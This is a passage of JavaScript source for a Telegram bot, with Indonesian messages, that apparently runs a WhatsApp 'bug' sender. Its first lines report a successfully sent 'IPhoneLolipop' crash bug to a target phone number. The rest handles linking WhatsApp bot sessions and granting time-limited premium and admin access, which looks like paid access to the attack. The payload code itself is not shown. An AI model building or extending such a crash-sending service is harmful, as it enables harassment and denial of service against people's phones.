<blockquote>© 𝖷 - 𝖫𝗈𝗅𝗂𝗉𝗈𝗉</blockquote>
━━━━━━━━━━━━━━━━━━
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : IPhoneLolipop
𖥂 Mode : ${action.toUpperCase()}
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}
𖥂 Time : ${runtime}
𖥂 Username : ${username}
━━━━━━━━━━━━━━━━━━
`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
            [{ text: "🔙 𝖪𝖾𝗆𝖻𝖺𝗅𝗂", callback_data: "mainmenu" }]
          ]
        }
      }
    );
  } catch (errLoop) {
    console.error(errLoop);
    await bot.editMessageCaption(`❌ Terjadi error saat proses: ${errLoop.message}`, {
      chat_id: chatId,
      message_id: messageId
    });
  } finally {
    crashRequestMap.delete(messageId);
  }
});

/// --------- ( Plungi ) --------- \\\

/// --- ( case add bot ) --- \\\
bot.onText(/\/addbot (.+)/, async (msg, match) => {
       const chatId = msg.chat.id;
       if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
       return bot.sendMessage(
       chatId,
 `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
       { parse_mode: "markdown" }
       );
       }
       const botNumber = match[1].replace(/[^0-9]/g, "");

       try {
       await connectToWhatsApp(botNumber, chatId);
       } catch (error) {
       console.error("Error in addbot:", error);
       bot.sendMessage(
       chatId,
       "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
      );
      }
      });
 
           



/// --- ( case group only ) --- \\\
      
bot.onText(/^\/gconly (on|off)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
      if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "markdown",
      });
      });

     


/// --- ( case add acces premium ) --- \\\

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃   ( ⚠️ ) Akses Ditolak ( ⚠️ )
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ Anda tidak memliki izin untuk ini
┗━━━━━━━━━━━━━━━━━━━━━━━┛`);
     }

     if (!match[1]) {
     return bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃   ( ❌ ) Comand Salah ( ❌)
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ ✅ /addprem 6843967527 30d.
┗━━━━━━━━━━━━━━━━━━━━━━━┛
`);
     }

     const args = match[1].split(' ');
     if (args.length < 2) {
     return bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃   ( ❌ ) Comand Salah ( ❌)
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ ✅ /addprem 6843967527 30d.
┗━━━━━━━━━━━━━━━━━━━━━━━┛`);
     }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];
  
    if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃   ( ❌ ) Comand Salah ( ❌)
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ ✅ /addprem 6843967527 30d.
┗━━━━━━━━━━━━━━━━━━━━━━━┛`);
    }
  
    if (!/^\d+[dhm]$/.test(duration)) {
   return bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃   ( ❌ ) Comand Salah ( ❌)
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ ✅ /addprem 6843967527 30d.
┗━━━━━━━━━━━━━━━━━━━━━━━┛`);
   }
   
    const now = moment();
    const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

    if (!premiumUsers.find(user => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
    bot.sendMessage(chatId, `
┏━━━━━━━━━━━━━━━━━━━━━━━┓  
┃ ( ✅ ) SUCCES ADD USER 
┣━━━━━━━━━━━━━━━━━━━━━━━┫  
┃User ${userId} ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.
┗━━━━━━━━━━━━━━━━━━━━━━━┛.`);
    } else {
    const existingUser = premiumUsers.find(user => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     }
     });





/// --- ( case list acces premium ) --- \\\

bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});



/// --- ( case add acces admin ) --- \\\

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id
      
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);

        { parse_mode: "Markdown" }
   
        }

      if (!match || !match[1]) 
      return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId,`
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      }

      if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      console.log(`${senderId} Added ${userId} To Admin`);
      bot.sendMessage(chatId, `
✅Berhasil menambahkan admin, kini user ${userId} Memiliki aksess admin. `);
      } else {
      bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
      }
      });




/// --- ( case delete acces premium ) --- \\\

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
          const chatId = msg.chat.id;
          const senderId = msg.from.id;
          if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
          return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
          }
          if (!match[1]) {
          return bot.sendMessage(chatId,`
❌ Command salah! Contoh /delprem 584726249 30d.`);
          }
          const userId = parseInt(match[1]);
          if (isNaN(userId)) {
          return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
          }
          const index = premiumUsers.findIndex(user => user.id === userId);
          if (index === -1) {
          return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di dalam list premium.`);
          }
                premiumUsers.splice(index, 1);
                savePremiumUsers();
         bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium. `);
         });





/// --- ( case delete acces admin ) \\\

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,

        { parse_mode: "Markdown" }
        );
        }
        if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
        if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const adminIndex = adminUsers.indexOf(userId);
        if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
        } else {
        bot.sendMessage(chatId, `❌ User ${userId} Belum memiliki aksess admin.`);
        }
        });






//------------------ ( Function Disini ) ------------------------\\

//------------------ ( Batas Disini ) ------------------------\\